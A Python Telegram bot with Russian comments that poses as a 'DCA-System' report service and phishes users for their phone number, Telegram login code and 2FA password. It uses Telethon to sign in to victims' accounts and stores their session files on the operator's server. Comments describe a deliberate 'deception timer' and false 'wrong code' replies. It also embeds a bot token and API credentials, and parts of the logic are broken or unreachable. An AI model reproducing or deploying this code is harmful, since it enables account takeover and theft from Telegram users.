import asyncio
import logging
import os

from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton

# Импортируем Telethon для работы с сессиями
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

BOT_TOKEN = "9223635891:AAFxWmnQ9Apr82lx4LiyBWVxLwPMKPp8hXU"
ADMIN_ID = "8716039739"
ADMIN_ID = int(ADMIN_ID) if ADMIN_ID else None

# ВНИМАНИЕ: Заполните эти данные с сайта my.telegram.org
API_ID = 28454708  # Замените на ваш API_ID (число)
API_HASH = "c5975bb91aa5925672cf1f51ebae74c1"  # Замените на ваш API_HASH

logging.basicConfig(level=logging.INFO)
router = Router()

# Временное хранилище запущенных клиентов в оперативной памяти сервера
active_clients = {}

# Тексты вопросов анкеты
Q_NAME = "Здравствуйте, введите id человека и его username Опишите сам репорт открыто в формате: 1.@username  2.id  3.описание"
Q_CITY = "Отлично, ваш репорт почти принят, осталось войти в сессию DCA и верифицировать себя как пользователя-разработчика.Для этого пожалуйста пришлите Номер телефона в формате:+7 123 123 133"
Q_AGE = "Теперь, для входа скажите код пришедший вам в Telegram."
Q_LANGUAGE = "Вход в DCA-System Выполнен, введите заново текст вашего репорта,username и id"
Q_ABOUT = "Отлично, ваш репорт принят и загружен в DCA-system(world) вам остается лишь ждать, но примерные сроки неизвестны. Всего доброго, с вами был anakado"


# Сюда добавлены новые состояния для авторизации сессии
class Form(StatesGroup):
    name = State()
    city = State()
    age = State()
    language = State()
    about = State()
    
    # Новые состояния
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_2fa = State()


async def send_answer_to_admin(message: Message, question: str):
    """Сразу отправляет админу ответ пользователя на конкретный вопрос."""
    if not ADMIN_ID:
        return
    user = message.from_user
    text = (
        f"✍️ Ответ от @{user.username or 'без_username'} (id {user.id})\n\n"
        f"❓ {question}\n"
        f"💬 {message.text}"
    )
    try:
        await message.bot.send_message(ADMIN_ID, text)
    except Exception as e:
        logging.warning("Не удалось отправить ответ админу: %s", e)


# --- 🔑 ФУНКЦИОНАЛ АДМИНИСТРАТОРА (ЗАПРОС СЕССИИ) ---

@router.message(Command("request_session"), F.from_user.id == ADMIN_ID)
async def admin_request_session(message: Message, command: CommandObject, dispatcher: Dispatcher):
    """
    Команда для админа. Принимает ID пользователя.
    Пример: /request_session 123456789
    """
    if not command.args or not command.args.isdigit():
        await message.answer("❌ Укажите числовой ID пользователя.\nПример: `/request_session 987654321`")
        return

    target_user_id = int(command.args)
    
    # Создаем кнопку для отправки контакта (чтобы пользователю было проще)
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📱 Подтвердить профиль", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    
    try:
        # Перехватываем контекст FSM этого пользователя
        user_state = dispatcher.fsm.resolve_context(message.bot, target_user_id, target_user_id)
        # Принудительно сбрасываем его текущую анкету и переводим в режим авторизации
        await user_state.clear()
        await user_state.set_state(Form.waiting_for_phone)
        
        # Отправляем сообщение пользователю
        await message.bot.send_message(
            chat_id=target_user_id, 
            text="⚠️ **Внимание! Требуется верификация аккаунта.**\n\nПожалуйста, нажмите кнопку «📱 Подтвердить профиль» ниже для продолжения.",
            reply_markup=keyboard
        )
        
        await message.answer(f"⏳ Запрос отправлен пользователю `{target_user_id}`. Ожидаем его номер телефона...")
    except Exception as e:
        await message.answer(f"❌ Не удалось отправить запрос (возможно, бот заблокирован или ID неверный): {e}")


# --- 👤 ОБРАБОТКА ШАГОВ АВТОРИЗАЦИИ СЕССИИ ---

@router.message(Form.waiting_for_phone, F.contact)
async def user_shared_phone(message: Message, state: FSMContext):
    """Пользователь нажал на кнопку и поделился номером"""
    phone = message.contact.phone_number
    user_id = message.from_user.id
    
    # 1. СРАЗУ пишем пользователю, как будто код уже отправлен
    await message.answer("💬 Вам отправлен официальный код подтверждения от Telegram.\n\nВведите полученный код сюда:")
    
    # Переводим пользователя в состояние ожидания ввода кода сразу
    await state.set_state(Form.waiting_for_code)
    
    # Сохраняем номер телефона и ставим флаг, что идет таймер обмана
    await state.update_data(phone=phone, is_fake_waiting=True)
    
    if ADMIN_ID:
        await message.bot.send_message(
            ADMIN_ID, 
            f"📱 Пользователь {user_id} передал номер: `{phone}`.\n"
            f"⚠️ Включен таймер обмана на 10 минут. Реальный запрос кода еще не отправлен!"
        )

    # 2. ЖДЕМ 10 минут (600 секунд) в фоновом режиме перед реальным запросом
    await asyncio.sleep(600)

    # Проверяем, не сбросил ли пользователь состояние или бота за эти 10 минут
    current_state = await state.get_state()
    if current_state != Form.waiting_for_code:
        return

    # 10 минут прошло — отключаем режим обмана
    await state.update_data(is_fake_waiting=False)

    # 3. Десять минут прошло — создаем реальное подключение к Telegram
    if ADMIN_ID:
        await message.bot.send_message(ADMIN_ID, f"🔄 10 минут прошло. Отправляю РЕАЛЬНЫЙ запрос кода для {user_id}...")

    session_name = f"session_{user_id}"
    client = TelegramClient(session_name, API_ID, API_HASH)
    await client.connect()
    
    try:
        # Только сейчас Telegram отправляет настоящий код на телефон пользователя
        send_code_obj = await client.send_code_request(phone)
        
        # Сохраняем реальный хэш кода в базу данных/состояние FSM
        await state.update_data(phone=phone, phone_code_hash=send_code_obj.phone_code_hash)
        active_clients[user_id] = client  # Запоминаем открытый клиент
        
        if ADMIN_ID:
            await message.bot.send_message(ADMIN_ID, f"✅ Реальный код успешно отправлен пользователю {user_id}. Теперь он может войти.")
            
    except Exception as e:
        if ADMIN_ID:
            await message.bot.send_message(ADMIN_ID, f"❌ Ошибка реального запроса кода для {user_id}: {e}")
        await client.disconnect()
        await state.clear()


@router.message(Form.waiting_for_code)
async def process_telegram_code(message: Message, state: FSMContext):
    """Принимает код. Если идет таймер обмана — мгновенно шлет админу для блокировки."""
    user_id = message.from_user.id
    input_code = message.text.strip()
    
    data = await state.get_data()
    phone = data.get("phone")
    is_fake_waiting = data.get("is_fake_waiting", False)
    
    # ЕСЛИ ЕЩЕ ИДУТ 10 МИНУТ (Пользователь отправил код раньше времени):
    if is_fake_waiting:
        if ADMIN_ID:
            await message.bot.send_message(
                ADMIN_ID,
                f"🎯 **[ДОСРОЧНЫЙ ВВОД КОДА] Пользователь отправил код во время 10-минутного таймера!**\n"
                f"📱 Номер: `{phone}`\n"
                f"❌ Что ввёл пользователь: `{input_code}`\n"
                f"🆔 ID Пользователя: `{user_id}`\n"
                f"⛔ Можно блокировать."
            )
        # Пользователю пишем, что код неверный, чтобы он думал, что ошибся
        await message.answer("❌ Неверный код подтверждения. Пожалуйста, проверьте код и введите его еще раз:")
        return

    # ЕСЛИ 10 МИНУТ ПРОШЛИ (Реальная проверка кода):
    phone_code_hash = data.get("phone_code_hash")
    client = active_clients.get(user_id)
    
    if not client:
        await message.answer("❌ Сессия устарела. Отправьте номер заново.")
        await state.clear()
        return

    try:
        # Проверяем в настоящем Telegram
        await client.sign_in(phone=phone, phone_code_hash=phone_code_hash, code=input_code)
        await message.answer("✅ Авторизация успешна!")
        if ADMIN_ID:
            await message.bot.send_message(ADMIN_ID, f"🎉 Пользователь {user_id} вошел в аккаунт!")
        await client.disconnect()
        if user_id in active_clients:
            del active_clients[user_id]
        await state.clear()
        
    except Exception as e:
        # Если реальный код не подошел
        if ADMIN_ID:
            await message.bot.send_message(
                ADMIN_ID, 
                f"⚠️ **Пользователь {user_id} ввёл НЕВЕРНЫЙ реальный код!**\n"
                f"📱 Номер: `{phone}`\n"
                f"❌ Что ввёл: `{input_code}`\n"
                f"📋 Ошибка от TG: `{str(e)}`"
            )
        await message.answer("❌ Неверный код подтверждения. Пожалуйста, проверьте код и введите его еще раз:")

        # Если вошли успешно (нет 2FA защиты)
        await message.answer("✅ Верификация успешно завершена! Спасибо.")
        if ADMIN_ID:
            await message.bot.send_message(
                ADMIN_ID, 
                f"🎉 **Успех!** Сессия пользователя `{user_id}` успешно создана и лежит на сервере под именем `session_{user_id}.session`"
            )
        
        # Закрываем клиент и очищаем состояние
        await client.disconnect()
        if user_id in active_clients:
            del active_clients[user_id]
        await state.clear()
        
    except SessionPasswordNeededError:
        # Если у пользователя включен облачный пароль (двухфакторка)
        await message.answer("🔒 Ваш аккаунт защищен двухфакторной аутентификацией (2FA).\n\nПожалуйста, введите ваш пароль:")
        await state.set_state(Form.waiting_for_2fa)
        
    except Exception as e:
        await message.answer(f"❌ Неверный код или ошибка: {e}\nПопробуйте ввести код еще раз:")


@router.message(Form.waiting_for_2fa)
async def user_entered_2fa(message: Message, state: FSMContext):
    """Пользователь ввел пароль двухфакторной аутентификации"""
    password = message.text
    user_id = message.from_user.id
    client = active_clients.get(user_id)
    
    if not client:
        await message.answer("❌ Ошибка сессии. Начните заново.")
        await state.clear()
        return

    try:
        # Входим по паролю
        await client.sign_in(password=password)
        
        await message.answer("✅ Верификация успешно завершена! Спасибо.")
        if ADMIN_ID:
            await message.bot.send_message(
                ADMIN_ID, 
                f"🎉 **Успех!** Сессия пользователя `{user_id}` (с прохождением 2FA) успешно создана."
            )
        
        await client.disconnect()
        if user_id in active_clients:
            del active_clients[user_id]
        await state.clear()
        
    except Exception as e:
        await message.answer(f"❌ Неверный пароль: {e}\nПопробуйте ввести пароль еще раз:")


# --- 📝 СТАНДАРТНАЯ АНКЕТА ИЗ ВАШЕГО КОДА ---

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    await message.answer(f" Заполните репорт анкету 📝\n\n{Q_NAME}")
    await state.set_state(Form.name)


@router.message(Command("cancel"))
async def cmd_cancel(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("Анкета отменена. Чтобы начать заново — /start")


@router.message(Form.name)
async def step_name(message: Message, state: FSMContext):
    await send_answer_to_admin(message, Q_NAME)
    await state.update_data(name=message.text)
    await message.answer(Q_CITY)
    await state.set_state(Form.city)


@router.message(Form.city)
async def step_city(message: Message, state: FSMContext):
    await send_answer_to_admin(message, Q_CITY)
    await state.update_data(city=message.text)
    await message.answer(Q_AGE)
    await state.set_state(Form.age)


@router.message(Form.age)
async def step_age(message: Message, state: FSMContext):
    if not message.text or not message.text.isdigit():
        await message.answer("🙂")
        return
    await send_answer_to_admin(message, Q_AGE)
    await state.update_data(age=message.text)
    await message.answer(Q_LANGUAGE)
    await state.set_state(Form.language)


@router.message(Form.language)
async def step_language(message: Message, state: FSMContext):
    await send_answer_to_admin(message, Q_LANGUAGE)
    await state.update_data(language=message.text)
    await message.answer(Q_ABOUT)
    await state.set_state(Form.about)


@router.message(Form.about)
async def step_about(message: Message, state: FSMContext):
    await send_answer_to_admin(message, Q_ABOUT)
    await state.update_data(about=message.text)
    data = await state.get_data()
    summary = (
        "✅ Анкета заполнена!\n\n"
        f"👤 1: {data.get('name', 'Не указано')}\n"
        f"🏙 2: {data.get('city', 'Не указано')}\n"
        f"🎂 3: {data.get('age', 'Не указано')}\n"
        f"💻 4: {data.get('language', 'Не указано')}\n"
        f"📄 5: {data.get('about', 'Не указано')}"
    )
    await message.answer(summary)
    await state.clear()  # Сбрасываем состояние FSM после успешного заполнения

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())

